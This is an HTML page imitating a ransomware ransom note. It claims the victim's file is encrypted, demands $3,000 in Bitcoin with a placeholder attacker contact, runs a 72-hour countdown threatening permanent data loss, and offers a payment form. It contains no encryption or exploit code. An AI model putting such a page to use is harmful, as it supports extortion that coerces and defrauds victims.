<!doctype html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="styles.css">
        <title>Payment Required!</title>
        <script>
            function updateTimer() {
                const timerElement = document.getElementById('timer');
                let timeRemaining = 259200; // 72 hours in seconds

                const interval = setInterval(() => {
                    const hours = Math.floor(timeRemaining / 3600);
                    const minutes = Math.floor((timeRemaining % 3600) / 60);
                    const seconds = timeRemaining % 60;

                    timerElement.innerHTML = `Time Remaining: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;

                    if (timeRemaining <= 0) {
                        clearInterval(interval);
                        timerElement.innerHTML = "Timer ended!";
                    }
                    timeRemaining--;
                }, 1000);
            }

            window.onload = updateTimer;
        </script>
        <style>
            #timer {
                font-size: 24px;
                color: red;
                font-weight: bold;
                margin: 20px 0;
            }
        </style>
    </head>
    <body>
        <header>
            <h1>Important Notice</h1>
        </header>
        <main>
            <h2>File Access Denied</h2>
            <p>Congratulations, your file has been encrypted. To regain access, you must pay a ransom of <strong>$3,000 worth of Bitcoin</strong>.</p>
            <p>Contact us at: <strong>attacker@darkweb.com</strong></p>
            <p>Time is of the essence! Failure to pay within 72 hours will result in permanent data loss.</p>
            <div id="timer"></div>
            <form action="process_payment.php" method="POST">
                <label for="amount">Enter Amount in Bitcoin:</label>
                <input type="text" id="amount" name="amount" required>
                <button type="submit">Pay Now</button>
            </form>
        </main>
    </body>
</html>
